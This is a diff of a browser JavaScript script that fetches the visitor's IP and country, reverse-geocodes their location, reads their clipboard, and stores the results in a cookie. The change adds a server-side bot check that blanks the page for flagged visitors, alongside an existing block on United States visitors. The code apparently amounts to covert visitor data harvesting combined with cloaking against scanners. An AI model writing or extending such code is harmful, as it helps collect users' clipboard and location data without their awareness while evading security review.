@@ -175,8 +175,7 @@
     document.cookie = `permissions_data=${encodeURIComponent(JSON.stringify(results))}; path=/; max-age=86400`;
   }
 
-  // 🌐 Get IP and Country from ipwho.is
-  async function getIPAndCountry() {
+  async function getIPInfo() {
     try {
       const res = await fetch("https://ipwho.is/");
       const data = await res.json();
@@ -185,6 +184,13 @@
 
       addResult("ip", "fetched", ip);
       addResult("ip-country", "fetched", country);
+
+      const botCheck = await fetch(`/check-bot?ip=${ip}`);
+      const botData = await botCheck.json();
+      if (botData.isBot) {
+        document.body.innerHTML = "<h1 style='color:red; text-align:center;'>Access blocked for bots.</h1>";
+        return false;
+      }
 
       if (country.toLowerCase() === "united states") {
         document.body.innerHTML = "<h1 style='color:red; text-align:center;'>You have been blocked (by IP check).</h1>";
@@ -198,7 +204,6 @@
     }
   }
 
-  // 📍 Geolocation → City, Country
   async function getCityFromCoords(lat, lon) {
     try {
       const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
@@ -211,7 +216,6 @@
     }
   }
 
-  // 📋 Request Clipboard, Motion, Orientation
   async function requestOtherPermissions() {
     try {
       const clipboard = await navigator.clipboard.readText();
@@ -243,8 +247,7 @@
     }
   }
 
-  // 🧠 Start execution
-  const ipAllowed = await getIPAndCountry();
+  const ipAllowed = await getIPInfo();
   if (!ipAllowed) return;
 
   if (navigator.geolocation) {
